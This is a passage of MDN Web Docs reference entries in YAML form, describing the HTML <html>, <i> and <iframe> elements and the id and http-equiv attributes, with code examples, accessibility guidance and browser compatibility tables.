  description: "# \\<html\\>: The HTML Document / Root element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fhtml&level=high)\n\nThe `<html>` [HTML](../index) element represents the root (top-level element) of an HTML document, so it is also referred to as the *root element*. All other elements must be descendants of this element. There can be only one `<html>` element in a document.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`version`](#version) Deprecated  \nSpecifies the version of the HTML [Document Type Definition](https://developer.mozilla.org/en-US/docs/Glossary/Doctype) that governs the current document. This attribute is not needed, because it is redundant with the version information in the document type declaration.\n\n[`xmlns`](#xmlns)  \nSpecifies the [XML](https://developer.mozilla.org/en-US/docs/Glossary/XML) [Namespace](https://developer.mozilla.org/en-US/docs/Glossary/Namespace) of the document. Default value is `\"http://www.w3.org/1999/xhtml\"`. This is required in documents parsed with XML [parsers](https://developer.mozilla.org/en-US/docs/Glossary/Parser), and optional in text/html documents.\n\n## Example\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <!-- … -->\n  </head>\n  <body>\n    <!-- … -->\n  </body>\n</html>\n```\n\n## Accessibility concerns\n\nWhile HTML does not require authors to specify `<html>` element start and ending tags, it is important for authors to do so as it will allow them to specify the [`lang`](../global_attributes#lang) for the webpage. Providing a `lang` attribute with a valid language tag according to [RFC 5646: Tags for Identifying Languages (also known as BCP 47)](https://datatracker.ietf.org/doc/html/rfc5646) on the `<html>` element will help screen reading technology determine the proper language to announce. The identifying language tag should describe the language used by the majority of the content of the page. Without it, screen readers will typically default to the operating system's set language, which may cause mispronunciations.\n\nIncluding a valid `lang` declaration on the `<html>` element also ensures that important metadata contained in the page's [`<head>`](head), such as the page's [`<title>`](title), are also announced properly.\n\n- [MDN Understanding WCAG, Guideline 3.1 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Understandable#guideline_3.1_%e2%80%94_readable_make_text_content_readable_and_understandable)\n- [Understanding Success Criterion 3.1.1 \\| W3C Understanding WCAG 2.1](https://www.w3.org/WAI/WCAG21/Understanding/language-of-page.html)\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `html`    | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `version` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `xmlns`   | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- MathML top-level element: [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math)\n- SVG top-level element: [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/html](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/html)"
- name: http-equiv (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`http-equiv`](element/meta#http-equiv)

    [`<meta>`](element/meta)

    Defines a pragma directive.
- name: i
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<i\\>: The Idiomatic Text element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fi&level=high)\n\nThe `<i>` [HTML](../index) element represents a range of text that is set off from the normal text for some reason, such as idiomatic text, technical terms, taxonomical designations, among others. Historically, these have been presented using italicized type, which is the original source of the `<i>` naming of this element.\n\n## Try it\n\n#### HTML Demo: \\<i\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>I looked at it and thought <i>This can't be real!</i></p>\n\n    <p><i>Musa</i> is one of two or three genera in the family <i>Musaceae</i>; it includes bananas and plantains.</p>\n\n    <p>\n      The term <i>bandwidth</i> describes the measure of how much information can pass through a data connection in a given\n      amount of time.\n    </p>\n\n    /* stylelint-disable-next-line block-no-empty */\n    i {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Use the `<i>` element for text that is set off from the normal prose for readability reasons. This would be a range of text with different semantic meaning than the surrounding text. Among the use cases for the `<i>` element are spans of text representing a different quality or mode of text, such as:\n  - Alternative voice or mood\n  - Taxonomic designations (such as the genus and species \"*Homo sapiens*\")\n  - Idiomatic terms from another language (such as \"*et cetera*\"); these should include the [`lang`](../global_attributes#lang) attribute to identify the language\n  - Technical terms\n  - Transliterations\n  - Thoughts (such as \"She wondered, *What is this writer talking about, anyway?*\")\n  - Ship or vessel names in Western writing systems (such as \"They searched the docks for the *Empress of the Galaxy*, the ship to which they were assigned.\")\n- In earlier versions of the HTML specification, the `<i>` element was merely a presentational element used to display text in italics, much like the `<b>` element was used to display text in bold letters. This is no longer true, as these tags now define semantics rather than typographic appearance. A browser will typically still display the contents of the `<i>` element in italic type, but is, by definition, no longer required to do so. To display text in italic type, authors should use the CSS [`font-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-style) property.\n- Be sure the text in question is not actually more appropriately marked up with another element.\n  - Use [`<em>`](em) to indicate stress emphasis.\n  - Use [`<strong>`](strong) to indicate importance, seriousness, or urgency.\n  - Use [`<mark>`](mark) to indicate relevance.\n  - Use [`<cite>`](cite) to mark up the name of a work, such as a book, play, or song.\n  - Use [`<dfn>`](dfn) to mark up the defining instance of a term.\n\n## Examples\n\nThis example demonstrates using the `<i>` element to mark text that is in another language.\n\nhtml\n\n```\n<p>\n  The Latin phrase <i lang=\"la\">Veni, vidi, vici</i> is often mentioned in\n  music, art, and literature.\n</p>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|     | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|     | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `i` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<em>`](em)\n- Other italicized elements: [`<var>`](var), [`<dfn>`](dfn), [`<cite>`](cite), [`<address>`](address)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/i](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/i)"
- name: id (attribute)
  summary: The id global attribute defines an identifier (ID) which must be unique in the whole document
  description: "# id\n\nThe `id` [global attribute](../global_attributes) defines an identifier (ID) which must be unique in the whole document.\n\n## Try it\n\n#### HTML Demo: id\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>A normal, boring paragraph. Try not to fall asleep.</p>\n\n    <p id=\"exciting\">The most exciting paragraph on the page. One of a kind!</p>\n\n    #exciting {\n      background: linear-gradient(to bottom, #ffe8d4, #f69d3c);\n      border: 1px solid #696969;\n      padding: 10px;\n      border-radius: 10px;\n      box-shadow: 2px 2px 1px black;\n    }\n\n    #exciting:before {\n      content: 'ℹ️';\n      margin-right: 5px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Description\n\nThe purpose of the ID attribute is to identify a single element when linking (using a [fragment identifier](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#fragment)), scripting, or styling (with [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS)).\n\nElements with ID attributes are available as global properties. The property name is the ID attribute, and the property value is the element. For example, given markup like:\n\nhtml\n\n```\n<p id=\"preamble\"></p>\n```\n\nYou could access the paragraph element in JavaScript using code like:\n\njs\n\n```\nconst content = window.preamble.textContent;\n```\n\n### Syntax\n\nAn ID attribute's value must not contain [ASCII whitespace](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace#in_html) characters. Browsers treat non-conforming IDs that contain whitespace as if the whitespace is part of the ID. In contrast to the [`class`](../global_attributes#class) attribute, which allows space-separated values, elements can only have one single ID value.\n\nTechnically, the value for an ID attribute may contain any other Unicode character. However, when used in CSS selectors, either from JavaScript using APIs like [`Document.querySelector()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector) or in CSS stylesheets, ID attribute values must be valid [CSS identifiers](https://developer.mozilla.org/en-US/docs/Web/CSS/ident). This means that if an ID attribute value is not a valid CSS identifier (for example, `my?id` or `1234`) then it must be escaped before being used in a selector, either using the [`CSS.escape()`](https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape_static) method or [manually](https://developer.mozilla.org/en-US/docs/Web/CSS/ident#escaping_characters).\n\nFor this reason, it's recommended that developers choose values for ID attributes that are valid CSS identifiers that don't require escaping.\n\nAlso, not all valid ID attribute values are valid JavaScript identifiers. For example, `1234` is a valid attribute value but not a valid JavaScript identifier. This means that the value is not a valid variable name, so you can't access the element using code like `window.1234`. However, you can access it using `window[\"1234\"]`.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- All [global attributes](../global_attributes).\n- [`Element.id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) that reflects this attribute.\n- The [`Document.getElementById`](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById) method.\n- CSS [ID selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/ID_selectors).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/id](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/id)"
- name: iframe
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<iframe\\>: The Inline Frame element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fiframe&level=high)\n\nThe `<iframe>` [HTML](../index) element represents a nested [browsing context](https://developer.mozilla.org/en-US/docs/Glossary/Browsing_context), embedding another HTML page into the current one.\n\n## Try it\n\n#### HTML Demo: \\<iframe\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <iframe\n      id=\"inlineFrameExample\"\n      title=\"Inline Frame Example\"\n      width=\"300\"\n      height=\"200\"\n      src=\"https://www.openstreetmap.org/export/embed.html?bbox=-0.004017949104309083%2C51.47612752641776%2C0.00030577182769775396%2C51.478569861898606&layer=mapnik\">\n    </iframe>\n\n    iframe {\n      border: 1px solid black;\n      width: 100%; /* takes precedence over the width set with the HTML width attribute */\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nEach embedded browsing context has its own [document](https://developer.mozilla.org/en-US/docs/Web/API/Document) and allows URL navigations. The navigations of each embedded browsing context are linearized into the [session history](https://developer.mozilla.org/en-US/docs/Web/API/History) of the *topmost* browsing context. The browsing context that embeds the others is called the *parent browsing context*. The *topmost* browsing context — the one with no parent — is usually the browser window, represented by the [`Window`](https://developer.mozilla.org/en-US/docs/Web/API/Window) object.\n\n**Warning:** Because each browsing context is a complete document environment, every `<iframe>` in a page requires increased memory and other computing resources. While theoretically you can use as many `<iframe>`s as you like, check for performance problems.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`allow`](#allow)  \nSpecifies a [Permissions Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Permissions_Policy) for the `<iframe>`. The policy defines what features are available to the `<iframe>` (for example, access to the microphone, camera, battery, web-share, etc.) based on the origin of the request.\n\nSee [iframes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy#iframes) in the `Permissions-Policy` topic for examples.\n\n**Note:** A Permissions Policy specified by the `allow` attribute implements a further restriction on top of the policy specified in the [`Permissions-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy) header. It doesn't replace it.\n\n[`allowfullscreen`](#allowfullscreen)  \nSet to `true` if the `<iframe>` can activate fullscreen mode by calling the [`requestFullscreen()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullscreen) method.\n\n**Note:** This attribute is considered a legacy attribute and redefined as `allow=\"fullscreen\"`.\n\n[`allowpaymentrequest`](#allowpaymentrequest) Deprecated Non-standard  \nSet to `true` if a cross-origin `<iframe>` should be allowed to invoke the [Payment Request API](https://developer.mozilla.org/en-US/docs/Web/API/Payment_Request_API).\n\n**Note:** This attribute is considered a legacy attribute and redefined as `allow=\"payment\"`.\n\n[`browsingtopics`](#browsingtopics) Experimental Non-standard  \nA boolean attribute that, if present, specifies that the selected topics for the current user should be sent with the request for the `<iframe>`'s source. See [Using the Topics API](https://developer.mozilla.org/en-US/docs/Web/API/Topics_API/Using) for more details.\n\n[`credentialless`](#credentialless) Experimental  \nSet to `true` to make the `<iframe>` credentialless, meaning that its content will be loaded in a new, ephemeral context. It doesn't have access to the network, cookies, and storage data associated with its origin. It uses a new context local to the top-level document lifetime. In return, the [`Cross-Origin-Embedder-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Embedder-Policy) (COEP) embedding rules can be lifted, so documents with COEP set can embed third-party documents that do not. See [IFrame credentialless](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless) for more details.\n\n[`csp`](#csp) Experimental  \nA [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) enforced for the embedded resource. See [`HTMLIFrameElement.csp`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp) for details.\n\n[`height`](#height)  \nThe height of the frame in CSS pixels. Default is `150`.\n\n[`loading`](#loading)  \nIndicates when the browser should load the iframe:\n\n[`eager`](#eager)  \nLoad the iframe immediately on page load (this is the default value).\n\n[`lazy`](#lazy)  \nDefer loading of the iframe until it reaches a calculated distance from the [visual viewport](https://developer.mozilla.org/en-US/docs/Glossary/Visual_Viewport), as defined by the browser. The intent is to avoid using the network and storage bandwidth required to fetch the frame until the browser is reasonably certain that it will be needed. This improves the performance and cost in most typical use cases, in particular by reducing initial page load times.\n\n**Note:** Loading is only deferred when JavaScript is enabled. This is an anti-tracking measure.\n\n[`name`](#name)  \nA targetable name for the embedded browsing context. This can be used in the `target` attribute of the [`<a>`](a), [`<form>`](form), or [`<base>`](base) elements; the `formtarget` attribute of the [`<input>`](input) or [`<button>`](button) elements; or the `windowName` parameter in the [`window.open()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) method.\n\n[`referrerpolicy`](#referrerpolicy)  \nIndicates which [referrer](https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer) to send when fetching the frame's resource:\n\n[`no-referrer`](#no-referrer)  \nThe [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent.\n\n[`no-referrer-when-downgrade`](#no-referrer-when-downgrade)  \nThe [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent to [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin)s without [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) ([HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/HTTPS)).\n\n[`origin`](#origin)  \nThe sent referrer will be limited to the origin of the referring page: its [scheme](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL), [host](https://developer.mozilla.org/en-US/docs/Glossary/Host), and [port](https://developer.mozilla.org/en-US/docs/Glossary/Port).\n\n[`origin-when-cross-origin`](#origin-when-cross-origin)  \nThe referrer sent to other origins will be limited to the scheme, the host, and the port. Navigations on the same origin will still include the path.\n\n[`same-origin`](#same-origin)  \nA referrer will be sent for [same origin](https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy), but cross-origin requests will contain no referrer information.\n\n[`strict-origin`](#strict-origin)  \nOnly send the origin of the document as the referrer when the protocol security level stays the same (HTTPS→HTTPS), but don't send it to a less secure destination (HTTPS→HTTP).\n\n[`strict-origin-when-cross-origin`](#strict-origin-when-cross-origin) (default)  \nSend a full URL when performing a same-origin request, only send the origin when the protocol security level stays the same (HTTPS→HTTPS), and send no header to a less secure destination (HTTPS→HTTP).\n\n[`unsafe-url`](#unsafe-url)  \nThe referrer will include the origin *and* the path (but not the [fragment](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/hash), [password](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/password), or [username](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/username)). **This value is unsafe**, because it leaks origins and paths from TLS-protected resources to insecure origins.\n\n[`sandbox`](#sandbox)  \nControls the restrictions applied to the content embedded in the `<iframe>`. The value of the attribute can either be empty to apply all restrictions, or space-separated tokens to lift particular restrictions:\n\n[`allow-downloads`](#allow-downloads)  \nAllows downloading files through an [`<a>`](a) or [`<area>`](area) element with the [download](a#download) attribute, as well as through the navigation that leads to a download of a file. This works regardless of whether the user clicked on the link, or JS code initiated it without user interaction.\n\n[`allow-forms`](#allow-forms)  \nAllows the page to submit forms. If this keyword is not used, a form will be displayed as normal, but submitting it will not trigger input validation, send data to a web server, or close a dialog.\n\n[`allow-modals`](#allow-modals)  \nAllows the page to open modal windows by [`Window.alert()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/alert), [`Window.confirm()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/confirm), [`Window.print()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/print) and [`Window.prompt()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/prompt), while opening a [`<dialog>`](dialog) is allowed regardless of this keyword. It also allows the page to receive [`BeforeUnloadEvent`](https://developer.mozilla.org/en-US/docs/Web/API/BeforeUnloadEvent) event.\n\n[`allow-orientation-lock`](#allow-orientation-lock)  \nLets the resource [lock the screen orientation](https://developer.mozilla.org/en-US/docs/Web/API/Screen/lockOrientation).\n\n[`allow-pointer-lock`](#allow-pointer-lock)  \nAllows the page to use the [Pointer Lock API](https://developer.mozilla.org/en-US/docs/Web/API/Pointer_Lock_API).\n\n[`allow-popups`](#allow-popups)  \nAllows popups (like from [`Window.open()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open), `target=\"_blank\"`, [`Window.showModalDialog()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/showModalDialog)). If this keyword is not used, that functionality will silently fail.\n\n[`allow-popups-to-escape-sandbox`](#allow-popups-to-escape-sandbox)  \nAllows a sandboxed document to open a new browsing context without forcing the sandboxing flags upon it. This will allow, for example, a third-party advertisement to be safely sandboxed without forcing the same restrictions upon the page the ad links to. If this flag is not included, a redirected page, popup window, or new tab will be subject to the same sandbox restrictions as the originating `<iframe>`.\n\n[`allow-presentation`](#allow-presentation)  \nAllows embedders to have control over whether an iframe can start a [presentation session](https://developer.mozilla.org/en-US/docs/Web/API/PresentationRequest).\n\n[`allow-same-origin`](#allow-same-origin)  \nIf this token is not used, the resource is treated as being from a special origin that always fails the [same-origin policy](https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy) (potentially preventing access to [data storage/cookies](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_data_storage_access) and some JavaScript APIs).\n\n[`allow-scripts`](#allow-scripts)  \nAllows the page to run scripts (but not create pop-up windows). If this keyword is not used, this operation is not allowed.\n\n[`allow-storage-access-by-user-activation`](#allow-storage-access-by-user-activation) Experimental  \nAllows a document loaded in the `<iframe>` to use the [Storage Access API](https://developer.mozilla.org/en-US/docs/Web/API/Storage_Access_API) to request access to unpartitioned cookies.\n\n[`allow-top-navigation`](#allow-top-navigation)  \nLets the resource navigate the top-level browsing context (the one named `_top`).\n\n[`allow-top-navigation-by-user-activation`](#allow-top-navigation-by-user-activation)  \nLets the resource navigate the top-level browsing context, but only if initiated by a user gesture.\n\n[`allow-top-navigation-to-custom-protocols`](#allow-top-navigation-to-custom-protocols)  \nAllows navigations to non-`http` protocols built into browser or [registered by a website](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler). This feature is also activated by `allow-popups` or `allow-top-navigation` keyword.\n\n**Note:**\n\n- When the embedded document has the same origin as the embedding page, it is **strongly discouraged** to use both `allow-scripts` and `allow-same-origin`, as that lets the embedded document remove the `sandbox` attribute — making it no more secure than not using the `sandbox` attribute at all.\n- Sandboxing is useless if the attacker can display content outside a sandboxed `iframe` — such as if the viewer opens the frame in a new tab. Such content should be also served from a *separate origin* to limit potential damage.\n\n**Note:** When redirecting the user, opening a popup window, or opening a new tab from an embedded page within an `<iframe>` with the `sandbox` attribute, the new browsing context is subject to the same `sandbox` restrictions. This can create issues — for example, if a page embedded within an `<iframe>` without a `sandbox=\"allow-forms\"` or `sandbox=\"allow-popups-to-escape-sandbox\"` attribute set on it opens a new site in a separate tab, form submission in that new browsing context will silently fail.\n\n[`src`](#src)  \nThe URL of the page to embed. Use a value of `about:blank` to embed an empty page that conforms to the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#inherited_origins). Also note that programmatically removing an `<iframe>`'s src attribute (e.g. via [`Element.removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/removeAttribute)) causes `about:blank` to be loaded in the frame in Firefox (from version 65), Chromium-based browsers, and Safari/iOS.\n\n**Note:** The `about:blank` page uses the embedding document's URL as its base URL when resolving any relative URLs, such as anchor links.\n\n[`srcdoc`](#srcdoc)  \nInline HTML to embed, overriding the `src` attribute. Its content should follow the syntax of a full HTML document, which includes the doctype directive, `<html>`, `<body>` tags, etc., although most of them can be omitted, leaving only the body content. This doc will have `about:srcdoc` as its location. If a browser does not support the `srcdoc` attribute, it will fall back to the URL in the `src` attribute.\n\n**Note:** The `about:srcdoc` page uses the embedding document's URL as its base URL when resolving any relative URLs, such as anchor links.\n\n[`width`](#width)  \nThe width of the frame in CSS pixels. Default is `300`.\n\n### Deprecated attributes\n\nThese attributes are deprecated and may no longer be supported by all user agents. You should not use them in new content, and try to remove them from existing content.\n\n[`align`](#align) Deprecated  \nThe alignment of this element with respect to the surrounding context.\n\n[`frameborder`](#frameborder) Deprecated  \nThe value `1` (the default) draws a border around this frame. The value `0` removes the border around this frame, but you should instead use the CSS property [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) to control `<iframe>` borders.\n\n[`longdesc`](#longdesc) Deprecated  \nA URL of a long description of the frame's content. Due to widespread misuse, this is not helpful for non-visual browsers.\n\n[`marginheight`](#marginheight) Deprecated  \nThe amount of space in pixels between the frame's content and its top and bottom borders.\n\n[`marginwidth`](#marginwidth) Deprecated  \nThe amount of space in pixels between the frame's content and its left and right borders.\n\n[`scrolling`](#scrolling) Deprecated  \nIndicates when the browser should provide a scrollbar for the frame:\n\n[`auto`](#auto)  \nOnly when the frame's content is larger than its dimensions.\n\n[`yes`](#yes)  \nAlways show a scrollbar.\n\n[`no`](#no)  \nNever show a scrollbar.\n\n## Scripting\n\nInline frames, like [`<frame>`](frame) elements, are included in the [`window.frames`](https://developer.mozilla.org/en-US/docs/Web/API/Window/frames) pseudo-array.\n\nWith the DOM [`HTMLIFrameElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement) object, scripts can access the [`window`](https://developer.mozilla.org/en-US/docs/Web/API/Window) object of the framed resource via the [`contentWindow`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/contentWindow) property. The [`contentDocument`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/contentDocument) property refers to the `document` inside the `<iframe>`, same as `contentWindow.document`.\n\nFrom the inside of a frame, a script can get a reference to its parent window with [`window.parent`](https://developer.mozilla.org/en-US/docs/Web/API/Window/parent).\n\nScript access to a frame's content is subject to the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). Scripts cannot access most properties in other `window` objects if the script was loaded from a different origin, including scripts inside a frame accessing the frame's parent. Cross-origin communication can be achieved using [`Window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).\n\n## Positioning and scaling\n\nBeing a [replaced element](https://developer.mozilla.org/en-US/docs/Web/CSS/Replaced_element), the `<iframe>` allows the position of the embedded document within its box to be adjusted using the [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) property.\n\n**Note:** The [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) property has no effect on `<iframe>` elements.\n\n## `error` and `load` event behavior\n\nThe `error` and `load` events fired on `<iframe>`s could be used to probe the URL space of the local network's HTTP servers. Therefore, as a security precaution user agents do not fire the [error](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/error_event) event on `<iframe>`s, and the [load](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/load_event) event is always triggered even if the `<iframe>` content fails to load.\n\n## Accessibility\n\nPeople navigating with assistive technology such as a screen reader can use the [`title` attribute](../global_attributes/title) on an `<iframe>` to label its content. The title's value should concisely describe the embedded content:\n\nhtml\n\n```\n<iframe\n  title=\"Wikipedia page for Avocados\"\n  src=\"https://en.wikipedia.org/wiki/Avocado\"></iframe>\n```\n\nWithout this title, they have to navigate into the `<iframe>` to determine what its embedded content is. This context shift can be confusing and time-consuming, especially for pages with multiple `<iframe>`s and/or if embeds contain interactive content like video or audio.\n\n## Examples\n\n### A simple \\<iframe\\>\n\nThis example embeds the page at [https://example.org](https://example.org) in an iframe. This is a common use case of iframes: to embed content from another site. For example, the live sample itself, and the [try it](#try_it) example at the top, are both `<iframe>` embeds of content from another MDN site.\n\n#### HTML\n\nhtml\n\n```\n<iframe\n  src=\"https://example.org\"\n  title=\"iframe Example 1\"\n  width=\"400\"\n  height=\"300\">\n</iframe>\n```\n\n#### Result\n\n### Embedding source code in an \\<iframe\\>\n\nThis example directly renders source code in an iframe. This can be used as a technique to prevent script injection when displaying user-generated content, when combined with the `sandbox` attribute.\n\nNote that when using `srcdoc`, any relative URLs in the embedded content will be resolved relative to the URL of the embedding page. If you want to use anchor links that point to places in the embedded content, you need to explicitly specify `about:srcdoc` as the base URL.\n\n#### HTML\n\nhtml\n\n```\n<article>\n  <footer>Nine minutes ago, <i>jc</i> wrote:</footer>\n  <iframe\n    sandbox\n    srcdoc=\"<p>There are two ways to use the <code>iframe</code> element:</p>\n<ol>\n<li><a href=&quot;about:srcdoc#embed_another&quot;>To embed content from another page</a></li>\n<li><a href=&quot;about:srcdoc#embed_user&quot;>To embed user-generated content</a></li>\n</ol>\n<h2 id=&quot;embed_another&quot;>Embedding content from another page</h2>\n<p>Use the <code>src</code> attribute to specify the URL of the page to embed:</p>\n<pre><code>&amp;lt;iframe src=&quot;https://example.org&quot;&amp;gt;&amp;lt;/iframe&amp;gt;</code></pre>\n<h2 id=&quot;embed_user&quot;>Embedding user-generated content</h2>\n<p>Use the <code>srcdoc</code> attribute to specify the content to embed. This post is already an example!</p>\n\"\n    width=\"500\"\n    height=\"250\"\n></iframe>\n</article>\n```\n\nHere's how to write escape sequences when using `srcdoc`:\n\n- First, write the HTML out, escaping anything you would escape in a normal HTML document (such as `<`, `>`, `&`, etc.).\n- `&lt;` and `<` represent the exact same character in the `srcdoc` attribute. Therefore, to make it an actual escape sequence in the HTML document, replace any ampersands (`&`) with `&amp;`. For example, `&lt;` becomes `&amp;lt;`, and `&amp;` becomes 